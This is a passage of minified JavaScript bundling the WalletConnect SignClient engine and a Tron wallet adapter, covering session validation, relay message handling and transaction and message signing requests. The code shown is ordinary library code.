                const {message: n} = Xe("MISSING_OR_INVALID", `reject() params: ${t}`);
                throw new Error(n)
            }
            const {id: o, reason: i} = t;
            if (this.checkRecentlyDeleted(o),
            await this.isValidProposalId(o),
            !_ne(i)) {
                const {message: n} = Xe("MISSING_OR_INVALID", `reject() reason: ${JSON.stringify(i)}`);
                throw new Error(n)
            }
        }
        ),
        qe(this, "isValidSessionSettleRequest", t => {
            if (!Io(t)) {
                const {message: f} = Xe("MISSING_OR_INVALID", `onSessionSettleRequest() params: ${t}`);
                throw new Error(f)
            }
            const {relay: o, controller: i, namespaces: n, expiry: s} = t;
            if (!nD(o)) {
                const {message: f} = Xe("MISSING_OR_INVALID", "onSessionSettleRequest() relay protocol should be a string");
                throw new Error(f)
            }
            const a = wne(i, "onSessionSettleRequest()");
            if (a)
                throw new Error(a.message);
            const l = w2(n, "onSessionSettleRequest()");
            if (l)
                throw new Error(l.message);
            if (Wc(s)) {
                const {message: f} = Xe("EXPIRED", "onSessionSettleRequest()");
                throw new Error(f)
            }
        }
        ),
        qe(this, "isValidUpdate", async t => {
            if (!Io(t)) {
                const {message: l} = Xe("MISSING_OR_INVALID", `update() params: ${t}`);
                throw new Error(l)
            }
            const {topic: o, namespaces: i} = t;
            this.checkRecentlyDeleted(o),
            await this.isValidSessionTopic(o);
            const n = this.client.session.get(o)
              , s = w2(i, "update()");
            if (s)
                throw new Error(s.message);
            const a = g_(n.requiredNamespaces, i, "update()");
            if (a)
                throw new Error(a.message)
        }
        ),
        qe(this, "isValidExtend", async t => {
            if (!Io(t)) {
                const {message: i} = Xe("MISSING_OR_INVALID", `extend() params: ${t}`);
                throw new Error(i)
            }
            const {topic: o} = t;
            this.checkRecentlyDeleted(o),
            await this.isValidSessionTopic(o)
        }
        ),
        qe(this, "isValidRequest", async t => {
            if (!Io(t)) {
                const {message: l} = Xe("MISSING_OR_INVALID", `request() params: ${t}`);
                throw new Error(l)
            }
            const {topic: o, request: i, chainId: n, expiry: s} = t;
            this.checkRecentlyDeleted(o),
            await this.isValidSessionTopic(o);
            const {namespaces: a} = this.client.session.get(o);
            if (!p_(a, n)) {
                const {message: l} = Xe("MISSING_OR_INVALID", `request() chainId: ${n}`);
                throw new Error(l)
            }
            if (!Ine(i)) {
                const {message: l} = Xe("MISSING_OR_INVALID", `request() ${JSON.stringify(i)}`);
                throw new Error(l)
            }
            if (!Wne(a, n, i.method)) {
                const {message: l} = Xe("MISSING_OR_INVALID", `request() method: ${i.method}`);
                throw new Error(l)
            }
            if (s && !Fne(s, B2)) {
                const {message: l} = Xe("MISSING_OR_INVALID", `request() expiry: ${s}. Expiry must be a number (in seconds) between ${B2.min} and ${B2.max}`);
                throw new Error(l)
            }
        }
        ),
        qe(this, "isValidRespond", async t => {
            var o;
            if (!Io(t)) {
                const {message: s} = Xe("MISSING_OR_INVALID", `respond() params: ${t}`);
                throw new Error(s)
            }
            const {topic: i, response: n} = t;
            try {
                await this.isValidSessionTopic(i)
            } catch (s) {
                throw (o = t == null ? void 0 : t.response) != null && o.id && this.cleanupAfterResponse(t),
                s
            }
            if (!One(n)) {
                const {message: s} = Xe("MISSING_OR_INVALID", `respond() response: ${JSON.stringify(n)}`);
                throw new Error(s)
            }
        }
        ),
        qe(this, "isValidPing", async t => {
            if (!Io(t)) {
                const {message: i} = Xe("MISSING_OR_INVALID", `ping() params: ${t}`);
                throw new Error(i)
            }
            const {topic: o} = t;
            await this.isValidSessionOrPairingTopic(o)
        }
        ),
        qe(this, "isValidEmit", async t => {
            if (!Io(t)) {
                const {message: a} = Xe("MISSING_OR_INVALID", `emit() params: ${t}`);
                throw new Error(a)
            }
            const {topic: o, event: i, chainId: n} = t;
            await this.isValidSessionTopic(o);
            const {namespaces: s} = this.client.session.get(o);
            if (!p_(s, n)) {
                const {message: a} = Xe("MISSING_OR_INVALID", `emit() chainId: ${n}`);
                throw new Error(a)
            }
            if (!Rne(i)) {
                const {message: a} = Xe("MISSING_OR_INVALID", `emit() event: ${JSON.stringify(i)}`);
                throw new Error(a)
            }
            if (!Mne(s, n, i.name)) {
                const {message: a} = Xe("MISSING_OR_INVALID", `emit() event: ${JSON.stringify(i)}`);
                throw new Error(a)
            }
        }
        ),
        qe(this, "isValidDisconnect", async t => {
            if (!Io(t)) {
                const {message: i} = Xe("MISSING_OR_INVALID", `disconnect() params: ${t}`);
                throw new Error(i)
            }
            const {topic: o} = t;
            await this.isValidSessionOrPairingTopic(o)
        }
        ),
        qe(this, "isValidAuthenticate", t => {
            const {chains: o, uri: i, domain: n, nonce: s} = t;
            if (!Array.isArray(o) || o.length === 0)
                throw new Error("chains is required and must be a non-empty array");
            if (!un(i, !1))
                throw new Error("uri is required parameter");
            if (!un(n, !1))
                throw new Error("domain is required parameter");
            if (!un(s, !1))
                throw new Error("nonce is required parameter");
            if ([...new Set(o.map(l => vm(l).namespace))].length > 1)
                throw new Error("Multi-namespace requests are not supported. Please request single namespace only.");
            const {namespace: a} = vm(o[0]);
            if (a !== "eip155")
                throw new Error("Only eip155 namespace is supported for authenticated sessions. Please use .connect() for non-eip155 chains.")
        }
        ),
        qe(this, "getVerifyContext", async t => {
            const {attestationId: o, hash: i, encryptedId: n, metadata: s, transportType: a} = t
              , l = {
                verified: {
                    verifyUrl: s.verifyUrl || Np,
                    validation: "UNKNOWN",
                    origin: s.url || ""
                }
            };
            try {
                if (a === kr.link_mode) {
                    const h = this.getAppLinkIfEnabled(s, a);
                    return l.verified.validation = h && new URL(h).origin === new URL(s.url).origin ? "VALID" : "INVALID",
                    l
                }
                const f = await this.client.core.verify.resolve({
                    attestationId: o,
                    hash: i,
                    encryptedId: n,
                    verifyUrl: s.verifyUrl
                });
                f && (l.verified.origin = f.origin,
                l.verified.isScam = f.isScam,
                l.verified.validation = f.origin === new URL(s.url).origin ? "VALID" : "INVALID")
            } catch (f) {
                this.client.logger.warn(f)
            }
            return this.client.logger.debug(`Verify context: ${JSON.stringify(l)}`),
            l
        }
        ),
        qe(this, "validateSessionProps", (t, o) => {
            Object.values(t).forEach( (i, n) => {
                if (i == null) {
                    const {message: s} = Xe("MISSING_OR_INVALID", `${o} must contain an existing value for each key. Received: ${i} for key ${Object.keys(t)[n]}`);
                    throw new Error(s)
                }
            }
            )
        }
        ),
        qe(this, "getPendingAuthRequest", t => {
            const o = this.client.auth.requests.get(t);
            return typeof o == "object" ? o : void 0
        }
        ),
        qe(this, "addToRecentlyDeleted", (t, o) => {
            if (this.recentlyDeletedMap.set(t, o),
            this.recentlyDeletedMap.size >= this.recentlyDeletedLimit) {
                let i = 0;
                const n = this.recentlyDeletedLimit / 2;
                for (const s of this.recentlyDeletedMap.keys()) {
                    if (i++ >= n)
                        break;
                    this.recentlyDeletedMap.delete(s)
                }
            }
        }
        ),
        qe(this, "checkRecentlyDeleted", t => {
            const o = this.recentlyDeletedMap.get(t);
            if (o) {
                const {message: i} = Xe("MISSING_OR_INVALID", `Record was recently deleted - ${o}: ${t}`);
                throw new Error(i)
            }
        }
        ),
        qe(this, "isLinkModeEnabled", (t, o) => {
            var i, n, s, a, l, f, h, p, b;
            return !t || o !== kr.link_mode ? !1 : ((n = (i = this.client.metadata) == null ? void 0 : i.redirect) == null ? void 0 : n.linkMode) === !0 && ((a = (s = this.client.metadata) == null ? void 0 : s.redirect) == null ? void 0 : a.universal) !== void 0 && ((f = (l = this.client.metadata) == null ? void 0 : l.redirect) == null ? void 0 : f.universal) !== "" && ((h = t == null ? void 0 : t.redirect) == null ? void 0 : h.universal) !== void 0 && ((p = t == null ? void 0 : t.redirect) == null ? void 0 : p.universal) !== "" && ((b = t == null ? void 0 : t.redirect) == null ? void 0 : b.linkMode) === !0 && this.client.core.linkModeSupportedApps.includes(t.redirect.universal) && typeof (global == null ? void 0 : global.Linking) < "u"
        }
        ),
        qe(this, "getAppLinkIfEnabled", (t, o) => {
            var i;
            return this.isLinkModeEnabled(t, o) ? (i = t == null ? void 0 : t.redirect) == null ? void 0 : i.universal : void 0
        }
        ),
        qe(this, "handleLinkModeMessage", ({url: t}) => {
            if (!t || !t.includes("wc_ev") || !t.includes("topic"))
                return;
            const o = IB(t, "topic") || ""
              , i = decodeURIComponent(IB(t, "wc_ev") || "")
              , n = this.client.session.keys.includes(o);
            n && this.client.session.update(o, {
                transportType: kr.link_mode
            }),
            this.client.core.dispatchEnvelope({
                topic: o,
                message: i,
                sessionExists: n
            })
        }
        ),
        qe(this, "registerLinkModeListeners", async () => {
            var t;
            if (C3() || Qc() && (t = this.client.metadata.redirect) != null && t.linkMode) {
                const o = global == null ? void 0 : global.Linking;
                if (typeof o < "u") {
                    o.addEventListener("url", this.handleLinkModeMessage, this.client.name);
                    const i = await o.getInitialURL();
                    i && setTimeout( () => {
                        this.handleLinkModeMessage({
                            url: i
                        })
                    }
                    , 50)
                }
            }
        }
        ),
        qe(this, "shouldSetTVF", (t, o) => {
            if (!o || t !== "wc_sessionRequest")
                return !1;
            const {request: i} = o;
            return Object.keys(X_).includes(i.method)
        }
        ),
        qe(this, "getTVFParams", (t, o, i) => {
            var n, s;
            try {
                const a = o.request.method
                  , l = this.extractTxHashesFromResult(a, i);
                return so(Mr({
                    correlationId: t,
                    rpcMethods: [a],
                    chainId: o.chainId
                }, this.isValidContractData(o.request.params) && {
                    contractAddresses: [(s = (n = o.request.params) == null ? void 0 : n[0]) == null ? void 0 : s.to]
                }), {
                    txHashes: l
                })
            } catch (a) {
                this.client.logger.warn("Error getting TVF params", a)
            }
            return {}
        }
        ),
        qe(this, "isValidContractData", t => {
            var o;
            if (!t)
                return !1;
            try {
                const i = (t == null ? void 0 : t.data) || ((o = t == null ? void 0 : t[0]) == null ? void 0 : o.data);
                if (!i.startsWith("0x"))
                    return !1;
                const n = i.slice(2);
                return /^[0-9a-fA-F]*$/.test(n) ? n.length % 2 === 0 : !1
            } catch {}
            return !1
        }
        ),
        qe(this, "extractTxHashesFromResult", (t, o) => {
            try {
                const i = X_[t];
                if (typeof o == "string")
                    return [o];
                const n = o[i.key];
                if (P0(n))
                    return t === "solana_signAllTransactions" ? n.map(s => rte(s)) : n;
                if (typeof n == "string")
                    return [n]
            } catch (i) {
                this.client.logger.warn("Error extracting tx hashes from result", i)
            }
            return []
        }
        )
    }
    async processPendingMessageEvents() {
        try {
            const e = this.client.session.keys
              , t = this.client.core.relayer.messages.getWithoutAck(e);
            for (const [o,i] of Object.entries(t))
                for (const n of i)
                    try {
                        await this.onProviderMessageEvent({
                            topic: o,
                            message: n,
                            publishedAt: Date.now()
                        })
                    } catch {
                        this.client.logger.warn(`Error processing pending message event for topic: ${o}, message: ${n}`)
                    }
        } catch (e) {
            this.client.logger.warn("processPendingMessageEvents failed", e)
        }
    }
    isInitialized() {
        if (!this.initialized) {
            const {message: e} = Xe("NOT_INITIALIZED", this.name);
            throw new Error(e)
        }
    }
    async confirmOnlineStateOrThrow() {
        await this.client.core.relayer.confirmOnlineStateOrThrow()
    }
    registerRelayerEvents() {
        this.client.core.relayer.on(Bn.message, e => {
            this.onProviderMessageEvent(e)
        }
        )
    }
    async onRelayMessage(e) {
        const {topic: t, message: o, attestation: i, transportType: n} = e
          , {publicKey: s} = this.client.auth.authKeys.keys.includes(Pm) ? this.client.auth.authKeys.get(Pm) : {
            publicKey: void 0
        };
        try {
            const a = await this.client.core.crypto.decode(t, o, {
                receiverPublicKey: s,
                encoding: n === kr.link_mode ? Nc : as
            });
            F3(a) ? (this.client.core.history.set(t, a),
            await this.onRelayEventRequest({
                topic: t,
                payload: a,
                attestation: i,
                transportType: n,
                encryptedId: js(o)
            })) : U1(a) ? (await this.client.core.history.resolve(a),
            await this.onRelayEventResponse({
                topic: t,
                payload: a,
                transportType: n
            }),
            this.client.core.history.delete(t, a.id)) : await this.onRelayEventUnknownPayload({
                topic: t,
                payload: a,
                transportType: n
            }),
            await this.client.core.relayer.messages.ack(t, o)
        } catch (a) {
            this.client.logger.error(a)
        }
    }
    registerExpirerEvents() {
        this.client.core.expirer.on(Oi.expired, async e => {
            const {topic: t, id: o} = vN(e.target);
            if (o && this.client.pendingRequest.keys.includes(o))
                return await this.deletePendingSessionRequest(o, Xe("EXPIRED"), !0);
            if (o && this.client.auth.requests.keys.includes(o))
                return await this.deletePendingAuthRequest(o, Xe("EXPIRED"), !0);
            t ? this.client.session.keys.includes(t) && (await this.deleteSession({
                topic: t,
                expirerHasDeleted: !0
            }),
            this.client.events.emit("session_expire", {
                topic: t
            })) : o && (await this.deleteProposal(o, !0),
            this.client.events.emit("proposal_expire", {
                id: o
            }))
        }
        )
    }
    registerPairingEvents() {
        this.client.core.pairing.events.on(Nl.create, e => this.onPairingCreated(e)),
        this.client.core.pairing.events.on(Nl.delete, e => {
            this.addToRecentlyDeleted(e.topic, "pairing")
        }
        )
    }
    isValidPairingTopic(e) {
        if (!un(e, !1)) {
            const {message: t} = Xe("MISSING_OR_INVALID", `pairing topic should be a string: ${e}`);
            throw new Error(t)
        }
        if (!this.client.core.pairing.pairings.keys.includes(e)) {
            const {message: t} = Xe("NO_MATCHING_KEY", `pairing topic doesn't exist: ${e}`);
            throw new Error(t)
        }
        if (Wc(this.client.core.pairing.pairings.get(e).expiry)) {
            const {message: t} = Xe("EXPIRED", `pairing topic: ${e}`);
            throw new Error(t)
        }
    }
    async isValidSessionTopic(e) {
        if (!un(e, !1)) {
            const {message: t} = Xe("MISSING_OR_INVALID", `session topic should be a string: ${e}`);
            throw new Error(t)
        }
        if (this.checkRecentlyDeleted(e),
        !this.client.session.keys.includes(e)) {
            const {message: t} = Xe("NO_MATCHING_KEY", `session topic doesn't exist: ${e}`);
            throw new Error(t)
        }
        if (Wc(this.client.session.get(e).expiry)) {
            await this.deleteSession({
                topic: e
            });
            const {message: t} = Xe("EXPIRED", `session topic: ${e}`);
            throw new Error(t)
        }
        if (!this.client.core.crypto.keychain.has(e)) {
            const {message: t} = Xe("MISSING_OR_INVALID", `session topic does not exist in keychain: ${e}`);
            throw await this.deleteSession({
                topic: e
            }),
            new Error(t)
        }
    }
    async isValidSessionOrPairingTopic(e) {
        if (this.checkRecentlyDeleted(e),
        this.client.session.keys.includes(e))
            await this.isValidSessionTopic(e);
        else if (this.client.core.pairing.pairings.keys.includes(e))
            this.isValidPairingTopic(e);
        else if (un(e, !1)) {
            const {message: t} = Xe("NO_MATCHING_KEY", `session or pairing topic doesn't exist: ${e}`);
            throw new Error(t)
        } else {
            const {message: t} = Xe("MISSING_OR_INVALID", `session or pairing topic should be a string: ${e}`);
            throw new Error(t)
        }
    }
    async isValidProposalId(e) {
        if (!Bne(e)) {
            const {message: t} = Xe("MISSING_OR_INVALID", `proposal id should be a number: ${e}`);
            throw new Error(t)
        }
        if (!this.client.proposal.keys.includes(e)) {
            const {message: t} = Xe("NO_MATCHING_KEY", `proposal id doesn't exist: ${e}`);
            throw new Error(t)
        }
        if (Wc(this.client.proposal.get(e).expiryTimestamp)) {
            await this.deleteProposal(e);
            const {message: t} = Xe("EXPIRED", `proposal id: ${e}`);
            throw new Error(t)
        }
    }
}
class pce extends _u {
    constructor(e, t) {
        super(e, t, Jae, k3),
        this.core = e,
        this.logger = t
    }
}
class gce extends _u {
    constructor(e, t) {
        super(e, t, Qae, k3),
        this.core = e,
        this.logger = t
    }
}
class yce extends _u {
    constructor(e, t) {
        super(e, t, tce, k3, o => o.id),
        this.core = e,
        this.logger = t
    }
}
class bce extends _u {
    constructor(e, t) {
        super(e, t, ice, L1, () => Pm),
        this.core = e,
        this.logger = t
    }
}
class mce extends _u {
    constructor(e, t) {
        super(e, t, sce, L1),
        this.core = e,
        this.logger = t
    }
}
class xce extends _u {
    constructor(e, t) {
        super(e, t, ace, L1, o => o.id),
        this.core = e,
        this.logger = t
    }
}
var wce = Object.defineProperty
  , vce = (r, e, t) => e in r ? wce(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , _2 = (r, e, t) => vce(r, typeof e != "symbol" ? e + "" : e, t);
class Tce {
    constructor(e, t) {
        this.core = e,
        this.logger = t,
        _2(this, "authKeys"),
        _2(this, "pairingTopics"),
        _2(this, "requests"),
        this.authKeys = new bce(this.core,this.logger),
        this.pairingTopics = new mce(this.core,this.logger),
        this.requests = new xce(this.core,this.logger)
    }
    async init() {
        await this.authKeys.init(),
        await this.pairingTopics.init(),
        await this.requests.init()
    }
}
var Ece = Object.defineProperty
  , Ace = (r, e, t) => e in r ? Ece(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , ar = (r, e, t) => Ace(r, typeof e != "symbol" ? e + "" : e, t);
class a1 extends sZ {
    constructor(e) {
        super(e),
        ar(this, "protocol", TD),
        ar(this, "version", ED),
        ar(this, "name", S2.name),
        ar(this, "metadata"),
        ar(this, "core"),
        ar(this, "logger"),
        ar(this, "events", new fs.EventEmitter),
        ar(this, "engine"),
        ar(this, "session"),
        ar(this, "proposal"),
        ar(this, "pendingRequest"),
        ar(this, "auth"),
        ar(this, "signConfig"),
        ar(this, "on", (o, i) => this.events.on(o, i)),
        ar(this, "once", (o, i) => this.events.once(o, i)),
        ar(this, "off", (o, i) => this.events.off(o, i)),
        ar(this, "removeListener", (o, i) => this.events.removeListener(o, i)),
        ar(this, "removeAllListeners", o => this.events.removeAllListeners(o)),
        ar(this, "connect", async o => {
            try {
                return await this.engine.connect(o)
            } catch (i) {
                throw this.logger.error(i.message),
                i
            }
        }
        ),
        ar(this, "pair", async o => {
            try {
                return await this.engine.pair(o)
            } catch (i) {
                throw this.logger.error(i.message),
                i
            }
        }
        ),
        ar(this, "approve", async o => {
            try {
                return await this.engine.approve(o)
            } catch (i) {
                throw this.logger.error(i.message),
                i
            }
        }
        ),
        ar(this, "reject", async o => {
            try {
                return await this.engine.reject(o)
            } catch (i) {
                throw this.logger.error(i.message),
                i
            }
        }
        ),
        ar(this, "update", async o => {
            try {
                return await this.engine.update(o)
            } catch (i) {
                throw this.logger.error(i.message),
                i
            }
        }
        ),
        ar(this, "extend", async o => {
            try {
                return await this.engine.extend(o)
            } catch (i) {
                throw this.logger.error(i.message),
                i
            }
        }
        ),
        ar(this, "request", async o => {
            try {
                return await this.engine.request(o)
            } catch (i) {
                throw this.logger.error(i.message),
                i
            }
        }
        ),
        ar(this, "respond", async o => {
            try {
                return await this.engine.respond(o)
            } catch (i) {
                throw this.logger.error(i.message),
                i
            }
        }
        ),
        ar(this, "ping", async o => {
            try {
                return await this.engine.ping(o)
            } catch (i) {
                throw this.logger.error(i.message),
                i
            }
        }
        ),
        ar(this, "emit", async o => {
            try {
                return await this.engine.emit(o)
            } catch (i) {
                throw this.logger.error(i.message),
                i
            }
        }
        ),
        ar(this, "disconnect", async o => {
            try {
                return await this.engine.disconnect(o)
            } catch (i) {
                throw this.logger.error(i.message),
                i
            }
        }
        ),
        ar(this, "find", o => {
            try {
                return this.engine.find(o)
            } catch (i) {
                throw this.logger.error(i.message),
                i
            }
        }
        ),
        ar(this, "getPendingSessionRequests", () => {
            try {
                return this.engine.getPendingSessionRequests()
            } catch (o) {
                throw this.logger.error(o.message),
                o
            }
        }
        ),
        ar(this, "authenticate", async (o, i) => {
            try {
                return await this.engine.authenticate(o, i)
            } catch (n) {
                throw this.logger.error(n.message),
                n
            }
        }
        ),
        ar(this, "formatAuthMessage", o => {
            try {
                return this.engine.formatAuthMessage(o)
            } catch (i) {
                throw this.logger.error(i.message),
                i
            }
        }
        ),
        ar(this, "approveSessionAuthenticate", async o => {
            try {
                return await this.engine.approveSessionAuthenticate(o)
            } catch (i) {
                throw this.logger.error(i.message),
                i
            }
        }
        ),
        ar(this, "rejectSessionAuthenticate", async o => {
            try {
                return await this.engine.rejectSessionAuthenticate(o)
            } catch (i) {
                throw this.logger.error(i.message),
                i
            }
        }
        ),
        this.name = (e == null ? void 0 : e.name) || S2.name,
        this.metadata = gee(e == null ? void 0 : e.metadata),
        this.signConfig = e == null ? void 0 : e.signConfig;
        const t = typeof (e == null ? void 0 : e.logger) < "u" && typeof (e == null ? void 0 : e.logger) != "string" ? e.logger : S1(m3({
            level: (e == null ? void 0 : e.logger) || S2.logger
        }));
        this.core = (e == null ? void 0 : e.core) || new Xae(e),
        this.logger = xo(t, this.name),
        this.session = new gce(this.core,this.logger),
        this.proposal = new pce(this.core,this.logger),
        this.pendingRequest = new yce(this.core,this.logger),
        this.engine = new hce(this),
        this.auth = new Tce(this.core,this.logger)
    }
    static async init(e) {
        const t = new a1(e);
        return await t.initialize(),
        t
    }
    get context() {
        return zo(this.logger)
    }
    get pairing() {
        return this.core.pairing.pairings
    }
    async initialize() {
        this.logger.trace("Initialized");
        try {
            await this.core.start(),
            await this.session.init(),
            await this.proposal.init(),
            await this.pendingRequest.init(),
            await this.auth.init(),
            await this.engine.init(),
            this.logger.info("SignClient Initialization Success"),
            setTimeout( () => {
                this.engine.processRelayMessageCache()
            }
            , Ze.toMiliseconds(Ze.ONE_SECOND))
        } catch (e) {
            throw this.logger.info("SignClient Initialization Failure"),
            this.logger.error(e.message),
            e
        }
    }
}
class jf extends Error {
    constructor() {
        super(),
        Object.setPrototypeOf(this, jf.prototype)
    }
}
class L3 extends Error {
    constructor(e) {
        super(e),
        Object.setPrototypeOf(this, L3.prototype)
    }
}
var cA;
(function(r) {
    r.Mainnet = "tron:0x2b6653dc",
    r.Shasta = "tron:0x94a9059e",
    r.Nile = "tron:0xcd8690dc"
}
)(cA || (cA = {}));
var Od;
(function(r) {
    r.signTransaction = "tron_signTransaction",
    r.signMessage = "tron_signMessage"
}
)(Od || (Od = {}));
const I2 = (r, e) => ({
    requiredNamespaces: {
        tron: {
            chains: [r],
            methods: [Od.signTransaction, Od.signMessage],
            events: []
        }
    },
    pairingTopic: e
});
class Pce {
    constructor(e) {
        this._options = e.options,
        this._network = e.network,
        this._modalConfig = e.web3ModalConfig || {},
        this.web3Modal = new uG({
            ...this._modalConfig,
            projectId: this._options.projectId,
            chains: [this._network, ...this._modalConfig.chains || []]
        })
    }
    async connect() {
        const e = this._client ?? await a1.init(this._options)
          , t = e.find(I2(this._network)).filter(o => o.acknowledged);
        if (t.length) {
            this._session = t[t.length - 1],
            this._client = e,
            this._client = e;
            const o = Object.values(this._session.namespaces).map(i => i.accounts).flat();
            return this.address = o[0].split(":")[2],
            {
                address: this.address
            }
        } else {
            const {uri: o, approval: i} = await e.connect(I2(this._network));
            return new Promise( (n, s) => {
                o && (this.web3Modal.openModal({
                    uri: o,
                    chains: [this._network]
                }),
                this.web3Modal.subscribeModal(a => {
                    a.open === !1 && s(new L3("Modal is closed."))
                }
                )),
                i().then(a => {
                    this._session = a,
                    this._client = e;
                    const l = Object.values(this._session.namespaces).map(f => f.accounts).flat();
                    this.address = l[0].split(":")[2],
                    n({
                        address: this.address
                    })
                }
                ).catch(s).finally( () => {
                    this.web3Modal.closeModal()
                }
                )
            }
            )
        }
    }
    async disconnect() {
        if (this._client && this._session)
            await this._client.disconnect({
                topic: this._session.topic,
                reason: Nr("USER_DISCONNECTED")
            }),
            this._session = void 0;
        else
            throw new jf
    }
    get client() {
        if (this._client)
            return Object.assign({}, this._client, {
                off: this._client.removeListener
            });
        throw new jf
    }
    async checkConnectStatus() {
        const e = this._client ?? await a1.init(this._options)
          , t = e.find(I2(this._network)).filter(o => o.acknowledged);
        if (t.length) {
            this._session = t[t.length - 1],
            this._client = e;
            const o = Object.values(this._session.namespaces).map(i => i.accounts).flat();
            return this.address = o[0].split(":")[2],
            {
                address: this.address
            }
        } else
            return {
                address: ""
            }
    }
    async signTransaction(e) {
        if (this._client && this._session) {
            const {result: t} = await this._client.request({
                chainId: this._network,
                topic: this._session.topic,
                request: {
                    method: Od.signTransaction,
                    params: {
                        address: this.address,
                        transaction: {
                            ...e
                        }
                    }
                }
            });
            return t
        } else
            throw new jf
    }
    async signMessage(e) {
        if (this._client && this._session) {
            const {signature: t} = await this._client.request({
                chainId: this._network,
                topic: this._session.topic,
                request: {
                    method: Od.signMessage,
                    params: {
                        address: this.address,
                        message: e
                    }
                }
            });
            return t
        } else
            throw new jf
    }
}
var gy = function(r, e, t, o) {
    function i(n) {
        return n instanceof t ? n : new t(function(s) {
            s(n)
        }
        )
    }
    return new (t || (t = Promise))(function(n, s) {
        function a(h) {
            try {
                f(o.next(h))
            } catch (p) {
                s(p)
            }
        }
        function l(h) {
            try {
                f(o.throw(h))
            } catch (p) {
                s(p)
            }
        }
        function f(h) {
            h.done ? n(h.value) : i(h.value).then(a, l)
        }
        f((o = o.apply(r, e || [])).next())
    }
    )
};
const Cce = "WalletConnect"
  , Sce = Object.keys(vE);
class Bce extends MH {
    constructor(e) {
        if (super(),
        this.name = Cce,
        this.url = "https://walletconnect.org",
        this.icon = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAwIiBoZWlnaHQ9IjMwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJtNjEuNDM4NTQsOTQuMDAzOGM0OC45MTEyMywtNDcuODg4MTcgMTI4LjIxMTk5LC00Ny44ODgxNyAxNzcuMTIzMjEsMGw1Ljg4NjU1LDUuNzYzNDJjMi40NDU1NiwyLjM5NDQxIDIuNDQ1NTYsNi4yNzY1MSAwLDguNjcwOTJsLTIwLjEzNjcsMTkuNzE1NWMtMS4yMjI3OCwxLjE5NzIxIC0zLjIwNTMsMS4xOTcyMSAtNC40MjgwOCwwbC04LjEwMDU4LC03LjkzMTE1Yy0zNC4xMjE2OSwtMzMuNDA3OTggLTg5LjQ0Mzg5LC0zMy40MDc5OCAtMTIzLjU2NTU4LDBsLTguNjc1MDYsOC40OTM2MWMtMS4yMjI3OCwxLjE5NzIgLTMuMjA1MywxLjE5NzIgLTQuNDI4MDgsMGwtMjAuMTM2NjksLTE5LjcxNTVjLTIuNDQ1NTYsLTIuMzk0NDEgLTIuNDQ1NTYsLTYuMjc2NTIgMCwtOC42NzA5Mmw2LjQ2MTAxLC02LjMyNTg4em0yMTguNzY3OCw0MC43NzM3NWwxNy45MjE3LDE3LjU0Njg5YzIuNDQ1NTQsMi4zOTQ0IDIuNDQ1NTYsNi4yNzY0OCAwLjAwMDAzLDguNjcwODlsLTgwLjgxMDE3LDc5LjEyMTE0Yy0yLjQ0NTU1LDIuMzk0NDIgLTYuNDEwNTksMi4zOTQ0NSAtOC44NTYxNiwwLjAwMDA2Yy0wLjAwMDAxLC0wLjAwMDAxIC0wLjAwMDAzLC0wLjAwMDAyIC0wLjAwMDA0LC0wLjAwMDAzbC01Ny4zNTQxNCwtNTYuMTU0NThjLTAuNjExMzksLTAuNTk4NiAtMS42MDI2NSwtMC41OTg2IC0yLjIxNDA0LDBjMCwwLjAwMDAxIC0wLjAwMDAxLDAuMDAwMDEgLTAuMDAwMDEsMC4wMDAwMmwtNTcuMzUyOTIsNTYuMTU0NTNjLTIuNDQ1NTQsMi4zOTQ0MyAtNi40MTA1OCwyLjM5NDQ3IC04Ljg1NjE2LDAuMDAwMDhjLTAuMDAwMDIsLTAuMDAwMDEgLTAuMDAwMDMsLTAuMDAwMDIgLTAuMDAwMDUsLTAuMDAwMDRsLTgwLjgxMjQyLC03OS4xMjIxOWMtMi40NDU1NiwtMi4zOTQ0IC0yLjQ0NTU2LC02LjI3NjUxIDAsLTguNjcwOTFsMTcuOTIxNzMsLTE3LjU0Njg3YzIuNDQ1NTYsLTIuMzk0NDEgNi40MTA2LC0yLjM5NDQxIDguODU2MTYsMGw1Ny4zNTQ5OCw1Ni4xNTUzNWMwLjYxMTM5LDAuNTk4NjEgMS42MDI2NSwwLjU5ODYxIDIuMjE0MDQsMGMwLjAwMDAxLDAgMC4wMDAwMiwtMC4wMDAwMSAwLjAwMDAzLC0wLjAwMDAybDU3LjM1MjEsLTU2LjE1NTMzYzIuNDQ1NSwtMi4zOTQ0NyA2LjQxMDU0LC0yLjM5NDU2IDguODU2MTYsLTAuMDAwMmMwLjAwMDAzLDAuMDAwMDMgMC4wMDAwNywwLjAwMDA3IDAuMDAwMSwwLjAwMDFsNTcuMzU0OSw1Ni4xNTU0M2MwLjYxMTM5LDAuNTk4NiAxLjYwMjY1LDAuNTk4NiAyLjIxNDA0LDBsNTcuMzUzOTgsLTU2LjE1NDMyYzIuNDQ1NTYsLTIuMzk0NDEgNi40MTA2LC0yLjM5NDQxIDguODU2MTYsMHoiIGZpbGw9IiMzYjk5ZmMiIGlkPSJzdmdfMSIvPjwvc3ZnPg==",
        this._readyState = wE.Found,
        this._state = Fs.Disconnect,
        this._disconnected = () => {
            const t = this._wallet;
            t && (t.client.off("session_delete", this._disconnected),
            this._wallet = null,
            this._address = null,
            this._state = Fs.Disconnect,
            this.emit("disconnect"),
            this.emit("stateChanged", this._state))
        }
        ,
        e = Object.assign({}, e),
        !e || typeof e != "object")
            throw new Error("[WalletconnectAdapter] config is required.");
        if (e.network || (console.error(`[WalletconnectAdapter] config.network must be one of ${Sce.join()} or a chainID such as 0x2b6653dc. Use Nile network instead.`),
        e.network = "Nile"),
        !e.options)
            throw new Error("[WalletconnectAdapter] config.options is required.");
        this._connecting = !1,
        this._wallet = null,
        this._address = null,
        this._config = e
    }
    get address() {
        return this._address
    }
    get readyState() {
        return this._readyState
    }
    get state() {
        return this._state
    }
    get connecting() {
        return this._connecting
    }
    connect() {
        return gy(this, void 0, void 0, function*() {
            try {
                if (this.connected || this.connecting)
                    return;
                if (this.state === Fs.NotFound)
                    throw new NH;
                this._connecting = !0;
                let e, t;
                try {
                    e = new Pce({
                        network: cA[this._config.network] || `tron:${this._config.network}`,
                        options: this._config.options,
                        web3ModalConfig: this._config.web3ModalConfig
                    }),
                    {address: t} = yield e.connect()
                } catch (o) {
